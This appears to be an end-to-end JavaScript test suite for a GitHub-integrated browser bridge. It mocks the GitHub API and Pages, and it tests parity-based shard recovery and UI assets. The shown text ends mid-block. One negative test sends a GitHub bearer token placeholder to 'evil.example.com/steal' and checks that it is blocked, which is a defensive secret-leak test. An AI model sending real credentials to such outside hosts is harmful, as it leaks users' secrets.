import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  SpiralCoreHostBridge as BridgeClassDirect,
  stitch_fetch_with_parity_recovery as stitchRecoverDirect,
} from '../../crates/wasm/js/worker_host_bridge.js';
import { startLocalRelay } from '../../relay/local-relay.mjs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const ROOT = path.resolve(__dirname, '..', '..');

function sha256Hex(buf) {
  return crypto.createHash('sha256').update(buf).digest('hex');
}

function xorBuffers(a, b) {
  const len = Math.max(a.length, b ? b.length : 0);
  const out = Buffer.alloc(len, 0);
  for (let i = 0; i < len; i += 1) {
    out[i] = (i < a.length ? a[i] : 0) ^ (b && i < b.length ? b[i] : 0);
  }
  return out;
}

async function runSuite() {
  console.log('=== E2E: Arbitrary-Repo GitHub Loop, Stitch 2-of-3 Custody & UI/Embeddability ===');

  // 1. Build 50-file arbitrary GitHub repository fixture + Pages/provenance + Stitch 3-shard mirrors
  const repoFiles = new Map();
  repoFiles.set('README.md', '# Arbitrary Test Repo\nInitial commit on main.\n');
  repoFiles.set('Cargo.toml', '[package]\nname = "arbitrary-demo"\nversion = "0.1.0"\n');
  for (let i = 1; i <= 48; i += 1) {
    const pad = String(i).padStart(2, '0');
    repoFiles.set(`src/mod_${pad}.rs`, `pub fn fn_${pad}() -> u32 { ${i} }\n`);
  }

  const branches = new Map([
    ['main', { sha: 'commit_main_001', files: new Map(repoFiles) }],
  ]);
  const prs = new Map();
  let nextPrNumber = 1;
  const authHeadersSeenByHost = [];

  // Build Stitch 2-of-3 parity fixture (3 shards: group 0 pairs shard_000 + shard_001; group 1 odd tail shard_002)
  const shard0 = crypto.randomBytes(512);
  const shard1 = crypto.randomBytes(512);
  const shard2 = crypto.randomBytes(384);
  const parity0 = xorBuffers(shard0, shard1);
  const parity1 = xorBuffers(shard2, null);
  const fullContainer = Buffer.concat([shard0, shard1, shard2]);
  const containerSha = sha256Hex(fullContainer);

  const weightManifest = {
    format: 'UORGLLM9',
    container_sha256: containerSha,
    total_bytes: fullContainer.length,
    shards: [
      { index: 0, file: 'shard_000.bin', byte_offset: 0, byte_length: shard0.length, sha256: sha256Hex(shard0) },
      { index: 1, file: 'shard_001.bin', byte_offset: shard0.length, byte_length: shard1.length, sha256: sha256Hex(shard1) },
      { index: 2, file: 'shard_002.bin', byte_offset: shard0.length + shard1.length, byte_length: shard2.length, sha256: sha256Hex(shard2) },
    ],
  };
  const stitchManifest = {
    schema: 'stitch/xor-2-of-3/1',
    scheme: 'xor-2-of-3',
    threshold: 2,
    count: 3,
    base_manifest: 'manifest.json',
    format: 'UORGLLM9',
    container_sha256: containerSha,
    total_bytes: fullContainer.length,
    data_shard_count: 3,
    groups: [
      {
        group_index: 0,
        left: { index: 0, file: 'shard_000.bin', byte_length: shard0.length, sha256: sha256Hex(shard0) },
        right: { index: 1, file: 'shard_001.bin', byte_length: shard1.length, sha256: sha256Hex(shard1) },
        parity: { index: null, file: 'parity_000.bin', byte_length: parity0.length, sha256: sha256Hex(parity0) },
      },
      {
        group_index: 1,
        left: { index: 2, file: 'shard_002.bin', byte_length: shard2.length, sha256: sha256Hex(shard2) },
        right: null,
        parity: { index: null, file: 'parity_001.bin', byte_length: parity1.length, sha256: sha256Hex(parity1) },
      },
    ],
  };

  let provenanceRevision = 1;
  let pagesStatus = 'built';
  let workflowPagesMode = false;

  const mockServer = http.createServer((req, res) => {
    const reqUrl = new URL(req.url || '/', 'http://127.0.0.1');
    const logicalHost = String(req.headers['x-logical-host'] || '127.0.0.1');
    if (req.headers.authorization) {
      authHeadersSeenByHost.push({ host: logicalHost, path: reqUrl.pathname, auth: req.headers.authorization });
    }

    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => {
      const bodyRaw = Buffer.concat(chunks).toString('utf8');
      const bodyJson = bodyRaw ? (() => { try { return JSON.parse(bodyRaw); } catch { return null; } })() : null;

      // Primary vs Mirror Stitch shard server routes
      if (reqUrl.pathname === '/weights-primary/shard_000.bin') {
        // Return corrupted bytes (SHA-256 mismatch) to force mirror/parity recovery!
        res.writeHead(200, { 'content-type': 'application/octet-stream' });
        res.end(Buffer.alloc(shard0.length, 0xaa));
        return;
      }
      if (reqUrl.pathname === '/weights-mirror/shard_000.bin') {
        res.writeHead(404);
        res.end('missing on mirror');
        return;
      }
      if (reqUrl.pathname === '/weights-primary/shard_001.bin') {
        res.writeHead(200, { 'content-type': 'application/octet-stream' });
        res.end(shard1);
        return;
      }
      if (reqUrl.pathname === '/weights-primary/shard_002.bin' || reqUrl.pathname === '/weights-mirror/shard_002.bin') {
        res.writeHead(503);
        res.end('shard_002 unavailable on all mirrors');
        return;
      }
      if (reqUrl.pathname === '/weights-primary/parity_000.bin' || reqUrl.pathname === '/weights-mirror/parity_000.bin') {
        res.writeHead(200, { 'content-type': 'application/octet-stream' });
        res.end(parity0);
        return;
      }
      if (reqUrl.pathname === '/weights-mirror/parity_001.bin') {
        res.writeHead(200, { 'content-type': 'application/octet-stream' });
        res.end(parity1);
        return;
      }
      if (reqUrl.pathname === '/weights-primary/parity_001.bin') {
        res.writeHead(404);
        res.end('only mirror carries parity_001');
        return;
      }

      // Pages provenance.json endpoint (must never receive Bearer secret)
      if (reqUrl.pathname === '/acme-pages/provenance.json') {
        res.writeHead(404, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ message: 'Root subpath-stripped provenance.json must 404 on subpath Pages' }));
        return;
      }
      if (reqUrl.pathname === '/acme-pages/any-repo/provenance.json' || reqUrl.pathname === '/provenance.json') {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({
          adapter_wasm_sha256: `wasm_digest_rev_${provenanceRevision}`,
          binding_javascript_sha256: `js_digest_rev_${provenanceRevision}`,
          generated_core_sha256: 'core_digest_001',
        }));
        return;
      }

      // Mock GitHub REST API for acme/any-repo
      const prefix = '/repos/acme/any-repo';
      if (req.method === 'GET' && reqUrl.pathname === prefix) {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ full_name: 'acme/any-repo', default_branch: 'main', private: false }));
        return;
      }
      if (req.method === 'GET' && reqUrl.pathname === `${prefix}/branches`) {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify(Array.from(branches.entries()).map(([name, b]) => ({ name, commit: { sha: b.sha } }))));
        return;
      }
      const treeMatch = reqUrl.pathname.match(/^\/repos\/acme\/any-repo\/git\/trees\/(.+)$/);
      if (req.method === 'GET' && treeMatch) {
        const refName = decodeURIComponent(treeMatch[1]);
        const br = branches.get(refName) || branches.get('main');
        const tree = Array.from(br.files.entries()).map(([p, content]) => ({
          path: p,
          type: 'blob',
          size: Buffer.byteLength(content),
          sha: `blob_${sha256Hex(Buffer.from(content)).slice(0, 12)}`,
        }));
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ sha: br.sha, tree }));
        return;
      }
      const refGetMatch = reqUrl.pathname.match(/^\/repos\/acme\/any-repo\/git\/ref\/heads\/(.+)$/);
      if (req.method === 'GET' && refGetMatch) {
        const refName = decodeURIComponent(refGetMatch[1]);
        const br = branches.get(refName);
        if (!br) {
          res.writeHead(404, { 'content-type': 'application/json' });
          res.end(JSON.stringify({ message: 'Ref not found' }));
          return;
        }
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ref: `refs/heads/${refName}`, object: { sha: br.sha } }));
        return;
      }
      if (req.method === 'POST' && reqUrl.pathname === `${prefix}/git/refs`) {
        const refName = String(bodyJson.ref || '').replace(/^refs\/heads\//, '');
        const baseBranch = Array.from(branches.values()).find((b) => b.sha === bodyJson.sha) || branches.get('main');
        branches.set(refName, { sha: `branch_${refName}_sha`, files: new Map(baseBranch.files) });
        res.writeHead(201, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ref: `refs/heads/${refName}`, object: { sha: `branch_${refName}_sha` } }));
        return;
      }
      const contentMatch = reqUrl.pathname.match(/^\/repos\/acme\/any-repo\/contents\/(.+)$/);
      if (req.method === 'GET' && contentMatch) {
        const filePath = decodeURIComponent(contentMatch[1]).replace(/\/+/g, '/');
        const refName = reqUrl.searchParams.get('ref') || 'main';
        const br = branches.get(refName) || branches.get('main');
        if (!br.files.has(filePath)) {
          res.writeHead(404, { 'content-type': 'application/json' });
          res.end(JSON.stringify({ message: 'Not Found' }));
          return;
        }
        const text = br.files.get(filePath);
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({
          path: filePath,
          encoding: 'base64',
          content: Buffer.from(text, 'utf8').toString('base64'),
          sha: `blob_${sha256Hex(Buffer.from(text)).slice(0, 12)}`,
        }));
        return;
      }
      if (req.method === 'POST' && reqUrl.pathname === `${prefix}/git/blobs`) {
        const content = bodyJson.encoding === 'base64'
          ? Buffer.from(bodyJson.content || '', 'base64').toString('utf8')
          : String(bodyJson.content || '');
        const blobSha = `blob_${sha256Hex(Buffer.from(content)).slice(0, 16)}`;
        res.writeHead(201, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ sha: blobSha, _content: content }));
        return;
      }
      const blobGetMatch = reqUrl.pathname.match(/^\/repos\/acme\/any-repo\/git\/blobs\/([^/]+)$/);
      if (req.method === 'GET' && blobGetMatch) {
        const wantedSha = decodeURIComponent(blobGetMatch[1]);
        let foundContent = null;
        for (const [, brObj] of branches.entries()) {
          for (const [, text] of brObj.files.entries()) {
            const candidateSha = `blob_${sha256Hex(Buffer.from(text)).slice(0, 12)}`;
            if (candidateSha === wantedSha) {
              foundContent = text;
              break;
            }
          }
          if (foundContent !== null) break;
        }
        if (foundContent === null) {
          res.writeHead(404, { 'content-type': 'application/json' });
          res.end(JSON.stringify({ message: 'Blob not found' }));
          return;
        }
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({
          sha: wantedSha,
          encoding: 'base64',
          content: Buffer.from(foundContent, 'utf8').toString('base64'),
          size: Buffer.byteLength(foundContent),
        }));
        return;
      }
      if (req.method === 'GET' && reqUrl.pathname.startsWith(`${prefix}/git/commits/`)) {
        const sha = reqUrl.pathname.split('/').pop();
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ sha, tree: { sha: `tree_${sha}` } }));
        return;
      }
      if (req.method === 'POST' && reqUrl.pathname === `${prefix}/git/trees`) {
        res.writeHead(201, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ sha: 'tree_updated_sha' }));
        return;
      }
      if (req.method === 'POST' && reqUrl.pathname === `${prefix}/git/commits`) {
        res.writeHead(201, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ sha: 'commit_new_002' }));
        return;
      }
      const refPatchMatch = reqUrl.pathname.match(/^\/repos\/acme\/any-repo\/git\/refs\/heads\/(.+)$/);
      if (req.method === 'PATCH' && refPatchMatch) {
        const refName = decodeURIComponent(refPatchMatch[1]);
        const br = branches.get(refName);
        if (br) br.sha = bodyJson.sha || 'commit_new_002';
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ ref: `refs/heads/${refName}`, object: { sha: br ? br.sha : 'commit_new_002' } }));
        return;
      }
      if (req.method === 'POST' && reqUrl.pathname === `${prefix}/pulls`) {
        const prNum = nextPrNumber++;
        const pr = {
          number: prNum,
          html_url: `https://github.com/acme/any-repo/pull/${prNum}`,
          state: 'open',
          mergeable: true,
          mergeable_state: 'clean',
          head: { ref: bodyJson.head, sha: (branches.get(bodyJson.head) || {}).sha || 'commit_new_002' },
          base: { ref: bodyJson.base },
        };
        prs.set(prNum, pr);
        res.writeHead(201, { 'content-type': 'application/json' });
        res.end(JSON.stringify(pr));
        return;
      }
      const prGetMatch = reqUrl.pathname.match(/^\/repos\/acme\/any-repo\/pulls\/(\d+)$/);
      if (req.method === 'GET' && prGetMatch) {
        const pr = prs.get(Number(prGetMatch[1]));
        res.writeHead(pr ? 200 : 404, { 'content-type': 'application/json' });
        res.end(JSON.stringify(pr || { message: 'PR not found' }));
        return;
      }
      if (req.method === 'GET' && reqUrl.pathname.endsWith('/check-runs')) {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({
          total_count: 2,
          check_runs: [
            { name: 'uor-verify', status: 'completed', conclusion: 'success' },
            { name: 'wasm-build', status: 'completed', conclusion: 'success' },
          ],
        }));
        return;
      }
      if (req.method === 'GET' && reqUrl.pathname === `${prefix}/actions/runs`) {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({
          workflow_runs: [{ name: 'ci', status: 'completed', conclusion: 'success', html_url: 'https://github.com/acme/any-repo/actions/runs/1' }],
        }));
        return;
      }
      const prMergeMatch = reqUrl.pathname.match(/^\/repos\/acme\/any-repo\/pulls\/(\d+)\/merge$/);
      if (req.method === 'PUT' && prMergeMatch) {
        const pr = prs.get(Number(prMergeMatch[1]));
        if (pr) {
          pr.state = 'closed';
          pr.merged = true;
        }
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ merged: true, sha: 'merge_sha_003', message: 'Pull Request successfully merged' }));
        return;
      }
      if (req.method === 'GET' && reqUrl.pathname === `${prefix}/pages`) {
        res.writeHead(200, { 'content-type': 'application/json' });
        if (workflowPagesMode) {
          res.end(JSON.stringify({
            status: null,
            build_type: 'workflow',
            html_url: 'https://acme.github.io/any-repo/',
          }));
        } else {
          res.end(JSON.stringify({
            status: pagesStatus,
            html_url: 'https://acme.github.io/any-repo/',
          }));
        }
        return;
      }
      if (req.method === 'GET' && reqUrl.pathname === `${prefix}/pages/builds/latest`) {
        if (workflowPagesMode) {
          res.writeHead(404, { 'content-type': 'application/json' });
          res.end(JSON.stringify({ message: 'Not Found', status: '404' }));
        } else {
          res.writeHead(200, { 'content-type': 'application/json' });
          res.end(JSON.stringify({ status: pagesStatus, commit: 'merge_sha_003', updated_at: '2026-11-14T18:50:00Z' }));
        }
        return;
      }
      if (req.method === 'GET' && reqUrl.pathname === `${prefix}/deployments`) {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify([
          { id: 77, sha: 'workflow_sha_777', environment: 'github-pages' },
        ]));
        return;
      }
      if (req.method === 'GET' && reqUrl.pathname === `${prefix}/deployments/77/statuses`) {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify([{ state: 'success' }]));
        return;
      }

      res.writeHead(404, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ message: `Unhandled mock route: ${req.method} ${reqUrl.pathname}` }));
    });
  });

  await new Promise((resolve) => mockServer.listen(0, '127.0.0.1', resolve));
  const mockAddr = mockServer.address();
  const baseHttp = `http://127.0.0.1:${mockAddr.port}`;

  // Custom fetch wrapper translating github REST & acme.github.io origins to local mockServer
  const routedFetch = async (url, init = {}) => {
    const parsed = new URL(String(url));
    const headers = { ...(init.headers || {}), 'x-logical-host': parsed.hostname };
    let targetPath = `${parsed.pathname}${parsed.search}`;
    if (parsed.hostname === 'acme.github.io') {
      targetPath = `/acme-pages${parsed.pathname}${parsed.search}`;
    } else if (parsed.hostname === 'evil.example.com') {
      targetPath = `/evil${parsed.pathname}${parsed.search}`;
    }
    return fetch(`${baseHttp}${targetPath}`, { ...init, headers });
  };

  // Start real local WebSocket relay
  const relayHandle = await startLocalRelay({ port: 0, host: '127.0.0.1', fetchImpl: routedFetch });
  const relayWsUrl = `ws://127.0.0.1:${relayHandle.port}/spvs`;

  try {
    // Test direct bridge module always, plus spliced public/lexlean_r4.js once built by xtask build-wasm
    const publicBundleSrc = fs.readFileSync(path.join(ROOT, 'public', 'lexlean_r4.js'), 'utf8');
    const publicBundleSpliced = publicBundleSrc.includes('UOR_CUSTOM_SECTION_1_START');
    if (process.env.REQUIRE_SPLICED_PUBLIC_BUNDLE === '1') {
      assert.ok(publicBundleSpliced, 'public/lexlean_r4.js must include spliced UOR custom sections');
    }
    const publicMod = publicBundleSpliced ? await import('../../public/lexlean_r4.js') : null;
    const bridgeTargets = [['crates/wasm/js/worker_host_bridge.js', BridgeClassDirect]];
    if (publicMod) {
      assert.equal(typeof publicMod.SpiralCoreHostBridge, 'function');
      assert.equal(typeof publicMod.stitch_fetch_with_parity_recovery, 'function');
      bridgeTargets.push(['public/lexlean_r4.js', publicMod.SpiralCoreHostBridge]);
    } else {
      console.log('  ℹ [public/lexlean_r4.js] baseline pre-merge bundle (authoritative bridge in worker_host_bridge.js; xtask build-wasm splices on merge)');
    }
    for (const [label, BridgeCtor] of bridgeTargets) {
      nextPrNumber = 1;
      prs.clear();
      authHeadersSeenByHost.length = 0;
      provenanceRevision = 1;

      const bridge = new BridgeCtor({
        fetchImpl: routedFetch,
        relayUrl: '', // exercise direct HTTPS + REST GitHub loop via routedFetch first
        staticOrigin: `${baseHttp}`,
        locationOrigin: 'https://acme.github.io/any-repo/',
      });
      bridge.setSecret('GITHUB_TOKEN', 'ghp_test_track_b_token');

      // 1a. Negative secret-leak test: disallow bearer secret injection to non-GitHub origin
      const evilAttempt = await bridge.handleHttpRequest({
        url: 'https://evil.example.com/steal',
        headers: { Authorization: 'Bearer {{MVM_SECRET:GITHUB_TOKEN}}' },
      });
      assert.equal(evilAttempt.ok, false);
      assert.equal(evilAttempt.error_code, 'HostNotAllowlistedForSecret');
      assert.equal(authHeadersSeenByHost.some((h) => h.host === 'evil.example.com'), false);
      console.log(`  ✓ [${label}] Negative HostNotAllowlistedForSecret blocks secret leak to non-GitHub hosts`);

      // 1b. detect_repo (from hosted acme.github.io origin)
      const detected = await bridge.handleGitBridge({ op: 'git', subcommand: 'detect_repo' });
      assert.equal(detected.ok, true);
      assert.equal(detected.repo, 'acme/any-repo');

      // 1c. connect + clone (>40 files -> first 40 hydrated, 10 lazy)
      const conn = await bridge.handleGitBridge({ op: 'git', subcommand: 'connect', repo: 'acme/any-repo' });
      assert.equal(conn.ok, true);
      assert.equal(conn.default_branch, 'main');
      assert.ok(conn.branches.includes('main'));

      const cloned = await bridge.handleGitBridge({ op: 'git', subcommand: 'clone', repo: 'acme/any-repo', branch: 'main' });
      assert.equal(cloned.ok, true);
      assert.equal(cloned.files.length, 50);
      const eagerCount = cloned.files.filter((f) => !f.lazy && typeof f.content === 'string').length;
      const lazyEntries = cloned.files.filter((f) => f.lazy && f.content === null);
      assert.equal(eagerCount, 40);
      assert.equal(lazyEntries.length, 10);
      assert.ok(Array.isArray(cloned.lazy_paths) && cloned.lazy_paths.length === 10);

      // 1d. lazy read_blob on demand
      const lazyTarget = lazyEntries[0].path;
      const blobRes = await bridge.handleGitBridge({
        op: 'git',
        subcommand: 'read_blob',
        repo: 'acme/any-repo',
        branch: 'main',
        path: lazyTarget,
      });
      assert.equal(blobRes.ok, true);
      assert.equal(blobRes.path, lazyTarget);
      assert.equal(blobRes.content, repoFiles.get(lazyTarget));

      // 1e. create_branch -> commit_push -> create_pr -> pr_status -> merge_pr -> watch_deploy
      const brRes = await bridge.handleGitBridge({
        op: 'git',
        subcommand: 'create_branch',
        repo: 'acme/any-repo',
        branch: 'feat/stitch-e2e',
        base_branch: 'main',
      });
      assert.equal(brRes.ok, true);
      assert.equal(brRes.branch, 'feat/stitch-e2e');

      const commitRes = await bridge.handleGitBridge({
        op: 'git',
        subcommand: 'commit_push',
        repo: 'acme/any-repo',
        branch: 'feat/stitch-e2e',
        message: 'Add Track B feature file',
        files: [{ path: 'src/new_track_b.rs', content: 'pub fn track_b() -> bool { true }\n' }],
      });
      assert.equal(commitRes.ok, true);
      assert.equal(commitRes.commit_sha, 'commit_new_002');

      const prRes = await bridge.handleGitBridge({
        op: 'git',
        subcommand: 'create_pr',
        repo: 'acme/any-repo',
        head: 'feat/stitch-e2e',
        base: 'main',
        title: 'Track B E2E PR',
      });
      assert.equal(prRes.ok, true);
      assert.equal(prRes.pr_number, 1);

      const statusRes = await bridge.handleGitBridge({
        op: 'git',
        subcommand: 'pr_status',
        repo: 'acme/any-repo',
        pr_number: 1,
      });
      assert.equal(statusRes.ok, true);
      assert.equal(statusRes.checks_total, 2);
      assert.equal(statusRes.mergeable, true);

      const mergeRes = await bridge.handleGitBridge({
        op: 'git',
        subcommand: 'merge_pr',
        repo: 'acme/any-repo',
        pr_number: 1,
      });
      assert.equal(mergeRes.ok, true);
      assert.equal(mergeRes.merged, true);

      // Watch deploy: baseline first (update_available false), then bump provenance revision -> update_available true!
      const watch1 = await bridge.handleGitBridge({ op: 'git', subcommand: 'watch_deploy', repo: 'acme/any-repo' });
      assert.equal(watch1.ok, true);
      assert.equal(watch1.pages_status, 'built');
      assert.equal(watch1.update_available, false);

      provenanceRevision = 2;
      const watch2 = await bridge.handleGitBridge({ op: 'git', subcommand: 'watch_deploy', repo: 'acme/any-repo' });
      assert.equal(watch2.ok, true);
      assert.equal(watch2.update_available, true);

      // Workflow-built GitHub Pages (build_type='workflow', status=null, pages/builds/latest=404)
      workflowPagesMode = true;
      const watchWorkflow = await bridge.handleGitBridge({ op: 'git', subcommand: 'watch_deploy', repo: 'acme/any-repo' });
      workflowPagesMode = false;
      assert.equal(watchWorkflow.ok, true);
      assert.equal(watchWorkflow.pages_status, 'built', 'workflow Pages must never report 404 from pages/builds/latest error JSON');
      assert.equal(watchWorkflow.deployment_sha, 'workflow_sha_777');

      // Unconnected watch_deploy on subpath-hosted GitHub Pages without explicit staticOrigin
      const subpathBridge = new BridgeCtor({
        fetchImpl: routedFetch,
        relayUrl: '',
        staticOrigin: '',
        locationOrigin: 'https://acme.github.io/any-repo/',
      });
      const watchSubpath = await subpathBridge.handleGitBridge({ op: 'git', subcommand: 'watch_deploy' });
      assert.equal(watchSubpath.ok, true, `subpath watch_deploy must resolve /any-repo/provenance.json: ${watchSubpath.message || ''}`);
      assert.equal(watchSubpath.adapter_wasm_sha256, 'wasm_digest_rev_2');

      // Verify Bearer token was NEVER transmitted to Pages / provenance host!
      const pagesAuthLeaks = authHeadersSeenByHost.filter((h) => h.host === 'acme.github.io' || h.path.includes('provenance.json'));
      assert.equal(pagesAuthLeaks.length, 0, 'Bearer token must NEVER be attached to provenance/Pages host');
      console.log(`  ✓ [${label}] Full arbitrary-repo loop (detect -> connect -> clone(50/lazy) -> read_blob -> branch -> commit_push -> PR -> CI -> merge -> watch_deploy[classic+workflow+subpath])`);
    }

    // 2. Test Live WebSocket Relay Path through relay/local-relay.mjs
    const wsBridge = new BridgeClassDirect({ fetchImpl: routedFetch, relayUrl: relayWsUrl });
    wsBridge.setSecret('GITHUB_TOKEN', 'ghp_ws_relay_secret');
    if (typeof WebSocket === 'function') {
      const relayBranches = await wsBridge.handleGitBridge({ op: 'git', subcommand: 'connect', repo: 'acme/any-repo' });
      assert.equal(relayBranches.ok, true);
      assert.ok(relayBranches.branches.includes('main'));
      console.log('  ✓ Live WebSocket relay/local-relay.mjs path executed cleanly');
    } else {
      console.log('  ℹ Global WebSocket unavailable in this Node runtime; skipping WS client leg');
    }

    // 3. Test Stitch 2-of-3 Multi-Source Parity Recovery & Health Telemetry (direct bridge + spliced public export if present)
    const recoverTargets = [['crates/wasm/js/worker_host_bridge.js', stitchRecoverDirect]];
    if (publicMod) {
      recoverTargets.push(['public/lexlean_r4.js', publicMod.stitch_fetch_with_parity_recovery]);
    }
    for (const [label, recoverFn] of recoverTargets) {
      const recovered = await recoverFn({
        manifest: weightManifest,
        baseUrl: `${baseHttp}/weights-primary/`,
        stitchManifest,
        mirrors: [`${baseHttp}/weights-mirror/`],
      });
      assert.equal(Buffer.compare(Buffer.from(recovered.fullBuf), fullContainer), 0);
      assert.equal(recovered.stitchHealth.scheme, 'stitch/xor-2-of-3/1');
      assert.equal(recovered.stitchHealth.healedShards, 2);
      assert.equal(recovered.stitchHealth.verifiedShards, 1);
      assert.equal(recovered.stitchHealth.status, 'Healed via 2-of-3 Parity');
      console.log(`  ✓ [${label}] Stitch 2-of-3 parity healed corrupted shard_000 & unavailable odd-tail shard_002 across mirrors`);

      // Negative test: missing both shard_002 and mirror parity_001 -> fails cleanly
      await assert.rejects(
        () => recoverFn({
          manifest: weightManifest,
          baseUrl: `${baseHttp}/weights-primary/`,
          stitchManifest,
          mirrors: [], // mirror holding parity_001 omitted
        }),
        /Stitch 2-of-3 parity recovery failed/
      );
      console.log(`  ✓ [${label}] Stitch negative test rejects when <2 of 3 shards available`);
    }

    // 4. Verify UI Controls, Honest GLLM v11 Models, 6-file public/ closure, site/app.json & ?embed=me bridge
    const publicFiles = fs.readdirSync(path.join(ROOT, 'public')).sort();
    assert.deepEqual(publicFiles, [
      'app.css',
      'app.js',
      'index.html',
      'lexlean_r4.js',
      'lexlean_r4_bg.wasm',
      'provenance.json',
    ]);

    const appJson = JSON.parse(fs.readFileSync(path.join(ROOT, 'site', 'app.json'), 'utf8'));
    assert.equal(appJson.schema, 'prism/r4-workspace/1');
    assert.equal(appJson.embed.queryParam, 'embed=me');
    assert.deepEqual(appJson.embed.postMessage.outbound, ['prism:ready', 'prism:status']);
    assert.deepEqual(appJson.embed.postMessage.inbound, ['prism:open-repo']);

    const rawHtml = fs.readFileSync(path.join(ROOT, 'public', 'index.html'), 'utf8');
    const rawJs = fs.readFileSync(path.join(ROOT, 'public', 'app.js'), 'utf8');
    const rawCss = fs.readFileSync(path.join(ROOT, 'public', 'app.css'), 'utf8');

    assert.ok(rawHtml.includes('<meta name="prism-surface" content="prism/r4-workspace/1">'));
    assert.ok(rawHtml.includes('id="studio-update-banner"'));
    assert.ok(rawHtml.includes('New Studio Version Live'));
    assert.ok(rawHtml.includes('id="topbar-feed-btn" type="button" class="topbar-btn" data-canvas-tab="feed">Self-Improvement</button>'));
    assert.ok(rawHtml.includes('id="topbar-consolidation-btn" type="button" class="topbar-btn" data-canvas-tab="consolidation">Consolidate Weights</button>'));
    for (const legacyId of ['claude-3-5-sonnet', 'gpt-4o', 'deepseek-r1', 'uor-r4-500b']) {
      assert.equal(rawHtml.includes(legacyId), false, `index.html must not contain legacy model ${legacyId}`);
      assert.equal(rawJs.includes(legacyId), false, `app.js must not contain legacy model ${legacyId}`);
    }
    for (const honestId of ['uor-r4.qwen3-0.6b-holo', 'uor-r4.qwen3-1.7b-holo', 'uor-r4.native-q31-d85', 'uor-r4.hf-repo-holo']) {
      assert.ok(rawHtml.includes(`value="${honestId}"`), `index.html missing ${honestId}`);
      assert.ok(rawJs.includes(`id: '${honestId}'`), `app.js COMPOSER_MODELS missing ${honestId}`);
    }
    assert.ok(rawCss.includes('#cowork-agent-status-bar:not([hidden]) {\n  display: flex;'), '#cowork-agent-status-bar:not([hidden]) must display flex cleanly');
    assert.equal(rawCss.includes('body[data-layout-mode="chat"] #cowork-agent-status-bar'), false, 'chat mode must not unconditionally hide #cowork-agent-status-bar');
    assert.ok(rawCss.includes('body.embed-me-compact > main'), 'app.css must style ?embed=me compact mode');
    assert.ok(rawJs.includes('force_refresh_reload') && rawJs.includes('studio_update_available') && rawJs.includes('prism:open-repo') && rawJs.includes('prism:ready'), 'app.js must implement provenance reload banner and ?embed=me postMessage bridge');

    for (const forbidden of ['https://', 'wss://', 'WebSocket', 'fetch(']) {
      assert.equal(rawHtml.includes(forbidden), false, `public/index.html contains forbidden ${forbidden}`);
      assert.equal(rawJs.includes(forbidden), false, `public/app.js contains forbidden ${forbidden}`);
      assert.equal(rawCss.includes(forbidden), false, `public/app.css contains forbidden ${forbidden}`);
    }
    console.log('  ✓ Strict 6-file public/ closure, site/app.json, UI controls & honest GLLM v11 models verified');

    // 5. Runtime DOM execution of public/app.js controls, Planning/Pool/Cowork/SCM, Update Banner & ?embed=me postMessage
    {
      class MiniEl {
        constructor(id = '') {
          this.id = id;
          this.children = [];
          this.attrs = {};
          this.listeners = {};
          this.textContent = '';
          this.value = '';
          this.disabled = false;
          this.style = {};
          this.dataset = {};
          const clSet = new Set();
          this.classList = {
            add: (...cs) => cs.forEach((c) => c && clSet.add(c)),
            remove: (...cs) => cs.forEach((c) => clSet.delete(c)),
            toggle: (c, f) => (typeof f === 'boolean' ? (f ? clSet.add(c) : clSet.delete(c)) : (clSet.has(c) ? clSet.delete(c) : clSet.add(c))),
            contains: (c) => clSet.has(c),
          };
        }
        setAttribute(k, v) { this.attrs[k] = String(v); }
        removeAttribute(k) { delete this.attrs[k]; }
        hasAttribute(k) { return Object.prototype.hasOwnProperty.call(this.attrs, k); }
        appendChild(ch) { this.children.push(ch); return ch; }
        replaceChildren(...args) { this.children = [...args]; }
        querySelector(sel) {
          if (sel === '.pool-review-file') return this._reviewFile || (this._reviewFile = new MiniEl());
          if (sel === '.pool-review-stats') return this._reviewStats || (this._reviewStats = new MiniEl());
          return null;
        }
        addEventListener(t, fn) { (this.listeners[t] ||= []).push(fn); }
        dispatchEvent(ev) {
          for (const fn of this.listeners[ev.type] || []) fn(ev);
        }
        click() { return this.dispatchEvent({ type: 'click', target: this }); }
        focus() {}
      }

      const ids = [
        'studio-update-banner', 'studio-update-banner-text', 'studio-refresh-reload-btn',
        'plan-dag-diagram', 'plan-checklist', 'pool-status-grid', 'pool-review-queue',
        'live-context-turn-digest', 'live-context-summary', 'live-engine-frontier-badge', 'live-otel-trace-badge',
        'composer-model-select', 'cursor-shards-grid', 'cursor-shards-summary', 'stitch-custody-health-card',
        'cursor-scm-summary', 'cursor-scm-list', 'scm-live-diff-preview', 'scm-lazy-status',
        'scm-repo-input', 'github-repo-input', 'scm-branch-select', 'github-branch-select',
        'scm-ci-pages-chip', 'scm-merge-pr-btn', 'github-connect-status',
        'toggle-studio-ide-btn', 'heading-claude-desktop', 'github-connect-modal',
      ];
      const byId = new Map(ids.map((id) => [id, new MiniEl(id)]));
      byId.get('studio-update-banner').setAttribute('hidden', '');
